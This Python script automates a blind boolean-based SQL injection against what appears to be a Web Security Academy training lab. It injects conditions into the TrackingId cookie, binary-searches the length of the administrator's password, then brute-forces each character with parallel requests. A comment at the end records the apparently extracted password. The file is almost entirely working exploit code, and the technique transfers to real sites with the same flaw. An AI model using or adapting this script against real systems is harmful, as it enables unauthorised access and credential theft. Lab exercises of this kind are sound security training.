import string
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

LAB_URL = 'https://0a6f006b04fde43f827c476a009000ba.web-security-academy.net/'

FILTERS = 'filter?category=Accessories'
ALPHABET = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
TRACK_ID = "nOknhc0E2ez12LTE"

def ping() -> bool:
    with requests.session() as session:
        SQL_CONDITION = "1=1"
        
        res = session.get(LAB_URL + FILTERS, cookies={
            'TrackingId': f"{TRACK_ID}' and {SQL_CONDITION} --"
        })

        if  res.text.count('Welcome back!') > 0:
            print("Tracking ID Recognized!\n")
            return True
            
        return False


def determine_length():
    with requests.session() as session:
        start = 1
        end = 50
        length = None
        
        while start <= end:
            mid = (start + end) // 2
            SQL_CONDITION = f"(SELECT length(password) FROM users WHERE username = 'administrator') > {mid}"
            
            res = session.get(LAB_URL + FILTERS, cookies={
                'TrackingId': f"{TRACK_ID}' and {SQL_CONDITION} --"
            })

            if res.text.count('Welcome back!') > 0:
                print(f"Password length > {mid}")
                start = mid + 1
            else:
                print(f"Password length <= {mid}")
                length = mid
                end = mid - 1
        
        print(f"Password length: {length}")
        return length
            
def check_letter_for_position(session, cur, letter):
    """Check if a letter matches at a given position"""
    try:
        res = session.get(LAB_URL + FILTERS, cookies={
            'TrackingId': f"{TRACK_ID}' and SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {cur}, 1) = '{letter}' --"
        })
        
        if res.text.count('Welcome back!') > 0:
            return letter, True
        return letter, False
    except Exception as e:
        print(f"Error: {e}")
        return letter, False

def crack_text_pwd(length: int):
    with requests.session() as session:
        result: list[str] = []
        
        while len(result) < length:
            cur = len(result) + 1
            print(f"\nSearching position {cur}...")
            
            found_letter = None
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {
                    executor.submit(check_letter_for_position, session, cur, letter): letter 
                    for letter in ALPHABET
                }
                
                for future in as_completed(futures):
                    letter, is_match = future.result()
                    
                    if is_match:
                        print(f"✓ {letter}", end=" ", flush=True)
                        found_letter = letter
                        [f.cancel() for f in futures]
                        break
                    
                    print(f"✗ {letter}", end=" ", flush=True)
            
            if found_letter:
                print(f"\n✓ Found: {found_letter} at position {cur}")
                result.append(found_letter)
                continue
            
            print(f"\n✗ Warning: No letter found for position {cur}")
            break
        
        print(f"\n\nPassword: {''.join(result)}")
        return ''.join(result)
            
   
if __name__ == '__main__':
    if not ping():
        print("Invalid Tracking ID, please refresh before attempting: ")
        exit()
        
    length = determine_length()
    crack_text_pwd(length)
    # hz71hmmn0nugun9upffw
    